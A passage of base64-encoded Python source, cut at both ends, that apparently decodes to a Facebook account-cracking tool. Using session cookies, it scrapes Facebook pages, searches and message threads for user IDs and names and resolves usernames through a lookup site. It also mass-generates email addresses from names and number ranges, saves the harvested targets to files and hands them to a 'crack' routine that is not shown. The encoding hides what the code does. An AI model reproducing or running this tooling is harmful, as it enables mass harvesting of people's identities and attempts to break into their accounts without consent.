lc0VSUk9SIElOIFNFQ1RJT04gOiAlcyclKE0sUCxNLFAsX2Vycm9yXykpO19jaWNpX2NpY2lfKCkNCiAgICAgICAgICAgIGVsc2U6amFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKTttZW51KCkNCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OnByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCBGUk9NICVzIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5mbCkucmVhZCgpLnNwbGl0bGluZXMoKSksc2VsZi5saXN0ZWQuZ2V0KCJuYW1lIikpKTtyZXR1cm4gY3JhY2soc2VsZi5mbCkNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBfZXJyb3JfOnByaW50KCdcbiVzIFslcyElc10gJXNFUlJPUiBJTiBTRUNUSU9OIDogJXMnJShNLFAsTSxQLF9lcnJvcl8pKTtfY2ljaV9jaWNpXygpDQogICAgZGVmIGYoc2VsZixpZCk6DQogICAgICAgIHNlbGYuZmw9KGlkLnJlcGxhY2UoJyAnLCdfJykrJy5qc29uJykNCiAgICAgICAgaWYgc2VsZi5mbD09Jyc6c2VsZi5mKCkNCiAgICAgICAgdHJ5Om9zLnJlbW92ZShzZWxmLmZsKQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICBfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsLCJ3IikuY2xvc2UoKQ0KICAgIGRlZiBkdW1wX3VzZXJuYW1lKHNlbGYsIHVybCk6DQogICAgICAgIHI9YnM0LkJlYXV0aWZ1bFNvdXAoX3JlcV9nZXRfKHVybCxjb29raWVzPXNlbGYuY29va2llcyxoZWFkZXJzPWhlYWRlcl9ncnVwKS50ZXh0LCJodG1sLnBhcnNlciIpO3ByaW50KCJcciVzIFslc+KAoiVzXSAlc1RBS0lORyAlcyVzIElEIiUoSCxQLEgsSyxILGxlbihfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsKS5yZWFkKCkuc3BsaXRsaW5lcygpKSksIGVuZD0nICcpO3N5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBmb3IgaSBpbiByLmZpbmRfYWxsKCJoMyIpOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGlmIGxlbihiczQucmUuZmluZGFsbCgiXC8iLGkuZmluZCgiYSIsaHJlZj1UcnVlKS5nZXQoImhyZWYiKSkpPT0xOg0KICAgICAgICAgICAgICAgICAgICBvZ2VoPWkuZmluZCgiYSIsaHJlZj1UcnVlKQ0KICAgICAgICAgICAgICAgICAgICBpZiAicHJvZmlsZS5waHAiIGluIG9nZWguZ2V0KCJocmVmIik6DQogICAgICAgICAgICAgICAgICAgICAgICBhPSIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoInByb2ZpbGVcLnBocFw/aWQ9KC4qPykmIixvZ2VoLmdldCgiaHJlZiIpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbihhKT09MDpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBhIGluIF9hemltdmF1X2RhcHVudGFfKHNlbGYuZmwpLnJlYWQoKTpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZTpfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShhLG9nZWgudGV4dCkpO2NvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBhPSIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoIi8oLio/KVw/IixvZ2VoLmdldCgiaHJlZiIpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbihhKT09MDpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBhIGluIF9hemltdmF1X2RhcHVudGFfKHNlbGYuZmwpLnJlYWQoKTpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZTpfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShhLG9nZWgudGV4dCkpDQogICAgICAgICAgICBleGNlcHQ6Y29udGludWUNCiAgICAgICAgZm9yIGkgaW4gci5maW5kX2FsbCgiYSIsaHJlZj1UcnVlKToNCiAgICAgICAgICAgIGlmICJTZWUgTW9yZSBQb3N0cyIgaW4gaS50ZXh0Og0KICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgIHRyeTpzZWxmLmR1bXBfdXNlcm5hbWUoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vIitpLmdldCgiaHJlZiIpKTticmVhaw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6cHJpbnQoJ1xyJXMgWyVzISVzXSAlc1JFUEVBVCclKE0sUCxNLE0pKTtjb250aW51ZQ0KICAgIGRlZiBkdW1wX2lkKHNlbGYsIHVybCk6DQogICAgICAgIHI9YnM0LkJlYXV0aWZ1bFNvdXAoX3JlcV9nZXRfKHVybCxjb29raWVzPXNlbGYuY29va2llcyxoZWFkZXJzPWhlYWRlcl9ncnVwKS50ZXh0LCJodG1sLnBhcnNlciIpO3ByaW50KCJcciVzIFslc+KAoiVzXSAlc1RBS0lORyAlcyVzIElEIiUoSCxQLEgsSyxILGxlbihfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsKS5yZWFkKCkuc3BsaXRsaW5lcygpKSksIGVuZD0nICcpO3N5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBmb3IgaSBpbiByLmZpbmRfYWxsKCJoMyIpOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGlmIGxlbihiczQucmUuZmluZGFsbCgiXC8iLGkuZmluZCgiYSIsaHJlZj1UcnVlKS5nZXQoImhyZWYiKSkpPT0xOg0KICAgICAgICAgICAgICAgICAgICBvZ2VoPWkuZmluZCgiYSIsaHJlZj1UcnVlKQ0KICAgICAgICAgICAgICAgICAgICBpZiAicHJvZmlsZS5waHAiIGluIG9nZWguZ2V0KCJocmVmIik6DQogICAgICAgICAgICAgICAgICAgICAgICBhPSIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoInByb2ZpbGVcLnBocFw/aWQ9KC4qPykmIixvZ2VoLmdldCgiaHJlZiIpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbihhKT09MDpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBhIGluIF9hemltdmF1X2RhcHVudGFfKHNlbGYuZmwpLnJlYWQoKTpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZTpfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShhLG9nZWgudGV4dCkpO2NvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBhPSIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoIi8oLio/KVw/IixvZ2VoLmdldCgiaHJlZiIpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbihhKT09MDpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBhIGluIF9hemltdmF1X2RhcHVudGFfKHNlbGYuZmwpLnJlYWQoKTpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZTpfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZsLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShfZ2V0X2lkXyhhKSxvZ2VoLnRleHQpKQ0KICAgICAgICAgICAgZXhjZXB0OmNvbnRpbnVlDQogICAgICAgIGZvciBpIGluIHIuZmluZF9hbGwoImEiLGhyZWY9VHJ1ZSk6DQogICAgICAgICAgICBpZiAiU2VlIE1vcmUgUG9zdHMiIGluIGkudGV4dDoNCiAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICB0cnk6c2VsZi5kdW1wX2lkKCJodHRwczovL20uZmFjZWJvb2suY29tLyIraS5nZXQoImhyZWYiKSk7YnJlYWsNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOnByaW50KCdcciVzIFslcyElc10gJXNNZW5ndWxhbmdpJyUoTSxQLE0sUCkpO2NvbnRpbnVlDQoNCg0KZGVmIF9nZXRfaWRfKHVzZXJuYW1lKToNCiAgICB1cmwgPSAiaHR0cHM6Ly9sb29rdXAtaWQuY29tLyMiDQogICAgd2l0aCBfcmVxX3Nlc18gYXMgZGV2Og0KICAgICAgICBwYXlsb2FkID0geyJmYnVybCI6ICJodHRwczovL20uZmFjZWJvb2suY29tL3t9Ii5mb3JtYXQodXNlcm5hbWUpLCAiY2hlY2siOiAiTG9va3VwIn0NCiAgICAgICAgaWYgImZhY2Vib29rIiBpbiB1c2VybmFtZTpwYXlsb2FkID0geyJmYnVybCI6IHVzZXJuYW1lLCAiY2hlY2siOiAiTG9va3VwIn0NCiAgICAgICAgZGF0YV9kZXYgPSBkZXYucG9zdCh1cmwsIGRhdGE9cGF5bG9hZCkuY29udGVudDtzb3BfID0gcGFyKGRhdGFfZGV2LCAiaHRtbC5wYXJzZXIiKTtpZF8gPSBzb3BfLmZpbmQoInNwYW4iLCBpZD0iY29kZSIpO3VzZXJfZ2V0X2lkID0gaWRfLnRleHQNCiAgICAgICAgcmV0dXJuIHVzZXJfZ2V0X2lkDQoNCg0KZGVmIGR1bXBfbmFtZShfYXppbXZhdV8pOg0KICAgIHByaW50KCclcyBbJXPigKIlc10gJXNFWEFNUExFIDogS2FjaGksIEthcm1hJyUoSCxQLEgsSykpO19fbmFtZV9fID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0VOVEVSIE5BTUUgOiAnJShILFAsSCxLKSkuc3BsaXQoJywnKTtfZmlsZV8gPSAnZHVtcF9uYW1lLmpzb24nDQogICAgdHJ5Om9zLnJlbW92ZShfZmlsZV8pDQogICAgZXhjZXB0OnBhc3MNCiAgICBmb3IgX25hbWVfIGluIF9fbmFtZV9fOl91cmxfID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZWFyY2gvcGVvcGxlLz9xPSIrX25hbWVfO2NhcmlfbmFtYShfZmlsZV8sX2F6aW12YXVfLF91cmxfKQ0KICAgIF9idWthX2ZpbGVfID0gX2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKTtwcmludCgiXG4lcyBbJXPigKIlc10gJXNUT1RBTCBJRCA6ICVzIiUoSCxQLEgsSyxzdHIobGVuKF9idWthX2ZpbGVfKSkpKQ0KICAgIHJldHVybiBjcmFjayhfZmlsZV8pDQpkZWYgY2FyaV9uYW1hKF9maWxlXyxfY29va2llc18sX3VybF8pOg0KICAgIF9hemltdmF1X2RhcHVudGFfKF9maWxlXywiYSsiKTtfcmVxX3Nlc19kZXZfID0gYnM0LkJlYXV0aWZ1bFNvdXAoX3JlcV9nZXRfKF91cmxfLCBjb29raWVzPV9jb29raWVzXyxoZWFkZXJzPWhlYWRlcl9uYW1hKS50ZXh0LCJodG1sLnBhcnNlciIpDQogICAgZm9yIF9hemltdmF1X2Rldl8gaW4gX3JlcV9zZXNfZGV2Xy5maW5kX2FsbCgiYSIsaHJlZj1UcnVlKToNCiAgICAgICAgcHJpbnQgKCJcciVzIFslc+KAoiVzXSAlc1RBS0lORyAlcyVzIElEIiUoSCxQLEgsSyxILGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSxlbmQ9JycpO3N5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICBpZiAiPGltZyBhbHQ9IiBpbiBzdHIoX2F6aW12YXVfZGV2Xyk6DQogICAgICAgICAgICBpZiAiaG9tZS5waHAiIGluIHN0cihfYXppbXZhdV9kZXZfWyJocmVmIl0pOmNvbnRpbnVlDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIF9zdHJfZGV2XyA9IHN0cihfYXppbXZhdV9kZXZfWyJocmVmIl0pDQogICAgICAgICAgICAgICAgaWYgInByb2ZpbGUucGhwIiBpbiBfc3RyX2Rldl86DQogICAgICAgICAgICAgICAgICAgIF9uYW1lXyA9IF9hemltdmF1X2Rldl8uZmluZCgiaW1nIikuZ2V0KCJhbHQiKS5yZXBsYWNlKCIsIHByb2ZpbGUgcGljdHVyZSIsIiIpO19maW5kXyA9IGJzNC5yZS5maW5kYWxsKCIvcHJvZmlsZVwucGhwXD9pZD0oLio/KSYiLF9zdHJfZGV2XykNCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuIChfZmluZF8pICE9MDoNCiAgICAgICAgICAgICAgICAgICAgICAgIF91c2VyXyA9ICIiLmpvaW4oX2ZpbmRfKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgX3VzZXJfIGluIF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZCgpOnBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6X2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShfdXNlcl8sX25hbWVfKSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBfZmluZF8gPSBiczQucmUuZmluZGFsbCgiLyguKj8pXD8iLF9zdHJfZGV2Xyk7X25hbWVfID0gX2F6aW12YXVfZGV2Xy5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikNCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKF9maW5kXykgIT0wOg0KICAgICAgICAgICAgICAgICAgICAgICAgX3VzZXJfPSIiLmpvaW4oX2ZpbmRfKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgX3VzZXJfIGluIF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZCgpOnBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6X2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShfdXNlcl8sX25hbWVfKSkNCiAgICAgICAgaWYgIlNlZSBNb3JlIFJlc3VsdHMiIGluIF9hemltdmF1X2Rldl8udGV4dDpjYXJpX25hbWEoX2ZpbGVfLF9jb29raWVzXyxfYXppbXZhdV9kZXZfWyJocmVmIl0pDQoNCg0KY2xhc3MgZHVtcF9wZXNhbjoNCiAgICBkZWYgX19pbml0X18oc2VsZixfY29va2llc18sX25hbWFfLF9pZF8pOg0KICAgICAgICBzZWxmLmNvb2tpZXMgPSBfY29va2llc187c2VsZi5pZCA9IF9pZF87c2VsZi5maWxlcyA9IChfbmFtYV8rJy5qc29uJykucmVwbGFjZSgiICIsIl8iKTtfYXppbXZhdV9kYXB1bnRhXyhzZWxmLmZpbGVzLCJ3IikuY2xvc2UoKTtzZWxmLmR1bXAoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vbWVzc2FnZXMiKQ0KICAgIGRlZiBkdW1wKHNlbGYsdXJsKToNCiAgICAgICAgX3JlcV9zZXNfZGV2XyA9IGJzNC5CZWF1dGlmdWxTb3VwKF9yZXFfZ2V0Xyh1cmwsaGVhZGVycz1oZWFkZXJfbmFtYSxjb29raWVzPXNlbGYuY29va2llcykudGV4dCwiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmb3IgX2Rldl8gaW4gX3JlcV9zZXNfZGV2Xy5maW5kX2FsbCgiYSIsaHJlZj1UcnVlKToNCiAgICAgICAgICAgIGlmICIvbWVzc2FnZXMvcmVhZCIgaW4gX2Rldl8uZ2V0KCJocmVmIik6DQogICAgICAgICAgICAgICAgX3NvdXBfID0gYnM0LnJlLmZpbmRhbGwoImNpZFwuY1wuKC4qPyklM0EoLio/KSYiLF9kZXZfLmdldCgiaHJlZiIpKQ0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgZm9yIF91c2VyXyBpbiBsaXN0KF9zb3VwXy5wb3AoKSk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBfdXNlcl8gaW4gc2VsZi5pZDpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAiRmFjZWJvb2sgdXNlciIgaW4gX2Rldl8udGV4dC5sb3dlcigpOmNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgX2F6aW12YXVfZGFwdW50YV8oc2VsZi5maWxlcywiYSsiKS53cml0ZSgiJXPigKIlc1xuIiUoX3VzZXJfLF9kZXZfLnRleHQpKTtwcmludCgiXHIlcyBbJXPigKIlc10gJXNUQUtJTkcgJXMlcyBJRCIlKEgsUCxILEssSCxsZW4oX2F6aW12YXVfZGFwdW50YV8oc2VsZi5maWxlcykucmVhZCgpLnNwbGl0bGluZXMoKSkpLGVuZD0nJyk7c3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOmNvbnRpbnVlDQogICAgICAgICAgICBpZiAiU2VlIE9sZGVyIE1lc3NhZ2VzIiBpbiBfZGV2Xy50ZXh0OnNlbGYuZHVtcCgiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8iK19kZXZfLmdldCgiaHJlZiIpKQ0KICAgICAgICBfYnVrYV9maWxlXyA9IF9hemltdmF1X2RhcHVudGFfKHNlbGYuZmlsZXMsJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpO3ByaW50KCJcbiVzIFslc+KAoiVzXSAlc1RPVEFMIElEIDogJXMiJShILFAsSCxLLHN0cihsZW4oX2J1a2FfZmlsZV8pKSkpDQogICAgICAgIHJldHVybiBjcmFjayhzZWxmLmZpbGVzKQ0KDQoNCg0KZGVmIGZpbGUoKToNCgl0cnk6DQoJCXByaW50KCIiKQ0KCQl4YyA9IGlucHV0KCclcyBbJXPigKIlc10gJXNGSUxFIDogJXMnJShILFAsSCxLLEgpKQ0KCQlpZCA9IG9wZW4oeGMpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCgkJcHJpbnQoJyVzIFslc+KAoiVzXSAlc1RPVEFMIElEIDogJXMlcyclKEgsUCxILE8sSCxsZW4oaWQpKSkNCgkJcmV0dXJuIGNyYWNrKHhjKQ0KCWV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCgkJcHJpbnQoIiVzIFslcyElc10gJXNGSUxFIE5PVCBFWElTVElORyIlKE0sUCxNLE0pKQ0KCQlmaWxlKCkNCgkJDQoNCmRlZiBkdW1wX2VtYWlsKCk6DQogICAgcHJpbnQoIiVzIFslc+KAoiVzXSAlc0VYQU1QTEUgOiBNYXJrIFp1Y2tlcmJlcmcgIiUoSCxQLEgsSykpO19xdWVyeV8gPSBfY2ljaV9hemltdmF1XygiJXMgWyVz4oCiJXNdICVzRU5URVIgTkFNRSA6ICIlKEgsUCxILEspKS5sb3dlcigpDQogICAgaWYgbGVuKF9xdWVyeV8pIDwgMzpqYWxhbignJXMgWyVzISVzXSAlc05BTUUgTVVTVCBCRSBNT1JFIFRIQU4gMiBESUdJVFMnJShNLFAsTSxQKSk7dGltZS5zbGVlcCgyKTttZW51KCkNCiAgICBwcmludCgiJXMgWyVz4oCiJXNdICVzRVhBTVBMRSA6ICVzZ21haWwuY29tIiUoSCxQLEgsSyxIKSk7X2RvbWFpbl8gPSBfY2ljaV9hemltdmF1XygiJXMgWyVz4oCiJXNdICVzRU5URVIgRE9NQUlOIDogIiUoSCxQLEgsSykpLmxvd2VyKCkNCiAgICBpZiAnQCcgaW4gX2RvbWFpbl86X2RvbWFpbl8gPSBfZG9tYWluXy5zcGxpdCgnQCcpWzFdDQogICAgX2xpbWl0X2F3YWxfID0gaW50KF9jaWNpX2F6aW12YXVfKCIlcyBbJXPigKIlc10gJXNFTlRFUiBTVEFSSU5HIE5VTUJFUiA6ICIlKEgsUCxILEspKSk7X2xpbWl0X2FraGlyXz0gaW50KF9jaWNpX2F6aW12YXVfKCIlcyBbJXPigKIlc10gJXNFTlRFUiBFTkRJTkcgTlVNQkVSIDogIiUoSCxQLEgsSykpKTtfZmlsZV8gPSAoX3F1ZXJ5XysiLmpzb24iKS5yZXBsYWNlKCIgIiwiXyIpDQogICAgdHJ5Om9zLnJlbW92ZShfZmlsZV8pDQogICAgZXhjZXB0OnBhc3MNCiAgICBleGVjX2VtYWlsKF9xdWVyeV8sX2RvbWFpbl8sX2xpbWl0X2F3YWxfLF9saW1pdF9ha2hpcl8sX2ZpbGVfKQ0KZGVmIGV4ZWNfZW1haWwoX19xdWVyeV9fLF9kb21haW5fLF9saW1pdF9hd2FsXyxfbGltaXRfYWtoaXJfLF9maWxlXyk6DQogICAgX2hpdHVuZ19lbWFpbF8xXyA9IF9saW1pdF9hd2FsXysxO19oaXR1bmdfZW1haWxfMl8gPSBfbGltaXRfYXdhbF8rMTtfaGl0dW5nX2VtYWlsXzNfID0gX2xpbWl0X2F3YWxfKzE7X2hpdHVuZ19lbWFpbF9mdWxsXyA9IF9saW1pdF9hd2FsXysxDQogICAgaWYgJyAnIGluIF9fcXVlcnlfXzoNCiAgICAgICAgdHJ5Ol9xdWVyeV8xXyA9IF9fcXVlcnlfXy5zcGxpdCgnICcpWzBdDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIHRyeTpfcXVlcnlfMl8gPSBfX3F1ZXJ5X18uc3BsaXQoJyAnKVsxXQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICB0cnk6X3F1ZXJ5XzNfID0gX19xdWVyeV9fLnNwbGl0KCcgJylbMl0NCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICBlbGlmICcuJyBpbiBfX3F1ZXJ5X186DQogICAgICAgIHRyeTpfcXVlcnlfMV8gPSBfX3F1ZXJ5X18uc3BsaXQoJy4nKVswXQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICB0cnk6X3F1ZXJ5XzJfID0gX19xdWVyeV9fLnNwbGl0KCcuJylbMV0NCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgdHJ5Ol9xdWVyeV8zXyA9IF9fcXVlcnlfXy5zcGxpdCgnLicpWzJdDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgZWxpZiAnXycgaW4gX19xdWVyeV9fOg0KICAgICAgICB0cnk6X3F1ZXJ5XzFfID0gX19xdWVyeV9fLnNwbGl0KCdfJylbMF0NCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgdHJ5Ol9xdWVyeV8yXyA9IF9fcXVlcnlfXy5zcGxpdCgnXycpWzFdDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIHRyeTpfcXVlcnlfM18gPSBfX3F1ZXJ5X18uc3BsaXQoJ18nKVsyXQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgIGVsaWYgJy0nIGluIF9fcXVlcnlfXzoNCiAgICAgICAgdHJ5Ol9xdWVyeV8xXyA9IF9fcXVlcnlfXy5zcGxpdCgnLScpWzBdDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIHRyeTpfcXVlcnlfMl8gPSBfX3F1ZXJ5X18uc3BsaXQoJy0nKVsxXQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICB0cnk6X3F1ZXJ5XzNfID0gX19xdWVyeV9fLnNwbGl0KCctJylbMl0NCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICBlbHNlOg0KICAgICAgICB0cnk6X3F1ZXJ5XzFfID0gX19xdWVyeV9fDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5IDoNCiAgICAgICAgZm9yIF9qdW1sYWhfIGluIHJhbmdlKF9saW1pdF9hd2FsXyxfbGltaXRfYWtoaXJfKToNCiAgICAgICAgICAgIHRyeTpuYW1hID0gX3F1ZXJ5XzFfO2VtYWlsID0gKCclcyVzQCVzJyUoX3F1ZXJ5XzFfLHN0cihfaGl0dW5nX2VtYWlsXzFfKSxfZG9tYWluXykpO19hemltdmF1X2RhcHVudGFfKF9maWxlXywnYSsnKS53cml0ZSgnJXPigKIlc1xuJyUoZW1haWwsbmFtYSkpO19oaXR1bmdfZW1haWxfMV8gKz0gMQ0KICAgICAgICAgICAgZXhjZXB0OmNvbnRpbnVlDQogICAgICAgIGZvciBfanVtbGFoXyBpbiByYW5nZShfbGltaXRfYXdhbF8sX2xpbWl0X2FraGlyXyk6DQogICAgICAgICAgICB0cnk6bmFtYSA9IF9xdWVyeV8yXztlbWFpbCA9ICgnJXMlc0AlcyclKF9xdWVyeV8yXyxzdHIoX2hpdHVuZ19lbWFpbF8yXyksX2RvbWFpbl8pKTtfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8sJ2ErJykud3JpdGUoJyVz4oCiJXNcbiclKGVtYWlsLG5hbWEpKTtfaGl0dW5nX2VtYWlsXzJfICs9IDENCiAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgICAgICBmb3IgX2p1bWxhaF8gaW4gcmFuZ2UoX2xpbWl0X2F3YWxfLF9saW1pdF9ha2hpcl8pOg0KICAgICAgICAgICAgdHJ5Om5hbWEgPSBfcXVlcnlfM187ZW1haWwgPSAoJyVzJXNAJXMnJShfcXVlcnlfM18sc3RyKF9oaXR1bmdfZW1haWxfM18pLF9kb21haW5fKSk7X2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfLCdhKycpLndyaXRlKCclc+KAoiVzXG4nJShlbWFpbCxuYW1hKSk7X2hpdHVuZ19lbWFpbF8zXyArPSAxDQogICAgICAgICAgICBleGNlcHQ6Y29udGludWUNCiAgICAgICAgZm9yIF9qdW1sYWhfIGluIHJhbmdlKF9saW1pdF9hd2FsXyxfbGltaXRfYWtoaXJfKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBpZiAnLicgaW4gX19xdWVyeV9fOl9xdWVyeV8gPSBfX3F1ZXJ5X187bmFtYSA9IF9fcXVlcnlfXy5yZXBsYWNlKCcuJywnICcpDQogICAgICAgICAgICAgICAgZWxpZiAnXycgaW4gX19xdWVyeV9fOl9xdWVyeV8gPSBfX3F1ZXJ5X187bmFtYSA9IF9fcXVlcnlfXy5yZXBsYWNlKCdfJywnICcpDQogICAgICAgICAgICAgICAgZWxpZiAnLScgaW4gX19xdWVyeV9fOl9xdWVyeV8gPSBfX3F1ZXJ5X187bmFtYSA9IF9fcXVlcnlfXy5yZXBsYWNlKCctJywnICcpDQogICAgICAgICAgICAgICAgZWxzZTpfcXVlcnlfID0gX19xdWVyeV9fLnJlcGxhY2UoJyAnLCcnKTtuYW1hID0gX19xdWVyeV9fDQogICAgICAgICAgICAgICAgZW1haWwgPSAoJyVzJXNAJXMnJShfcXVlcnlfLHN0cihfaGl0dW5nX2VtYWlsX2Z1bGxfKSxfZG9tYWluXykpO19hemltdmF1X2RhcHVudGFfKF9maWxlXywnYSsnKS53cml0ZSgnJXPigKIlc1xuJyUoZW1haWwsbmFtYSkpO19oaXR1bmdfZW1haWxfZnVsbF8gKz0gMQ0KICAgICAgICAgICAgZXhjZXB0OmNvbnRpbnVlDQogICAgZXhjZXB0Og0KICAgICAgICBqYWxhbignJXMgWyVzISVzXSAlc1RIRVJFIElTIEFOIEVSUk9SJyUoTSxQLE0sTSkpDQogICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICAgbWVudSgpDQogICAgX2J1a2FfZmlsZV8gPSBfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8sJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpDQogICAgcHJpbnQoIiVzIFslc+KAoiVzXSAlc1RPVEFMIElEIDogJXMlcyIlKEgsUCxILEssSCxzdHIobGVuKF9idWthX2ZpbGVfKSkpKQ0KICAgIHJldHVybiBjcmFjayhfZmlsZV8pDQoNCg0KZGVmIGR1bXBfdXNlcm5hbWUoKToNCiAgICBwcmludCgiJXMgWyVz4oCiJXNdICVzRVhBTVBMRSA6ICVzbWFyay56dWNrZXJidXJnZSIlKEgsUCxILEssSCkpO19xdWVyeV8gPSBfY2ljaV9hemltdmF1XygiJXMgWyVz4oCiJXNdICVzRU5URVIgTkFNRSA6ICIlKEgsUCxILEspKS5sb3dlcigpDQogICAgaWYgbGVuKF9xdWVyeV8pIDwgMzpqYWxhbignJXMgWyVzISVzXSAlc05BTUUgTVVTVCBCRSBNT1JFIFRIQU4gMiBESUdJVFMnJShNLFAsTSxNKSk7dGltZS5zbGVlcCgyKTttZW51KCkNCiAgICBfbGltaXRfYXdhbF8gPSBpbnQoX2NpY2lfYXppbXZhdV8oIiVzIFslc+KAoiVzXSAlc0VOVEVSIFNUQVJUSU5HIE5VTUJFUiAoRVg6IDEpIDogIiUoSCxQLEgsUCkpKTtfbGltaXRfYWtoaXJfPSBpbnQoX2NpY2lfYXppbXZhdV8oIiVzIFslc+KAoiVzXSAlc0VOVEVSIEVORElORyBOVU1CRVIgKEVYOiAxMDAwKTogIiUoSCxQLEgsUCkpKTtfZmlsZV8gPSAoX3F1ZXJ5XysiLmpzb24iKS5yZXBsYWNlK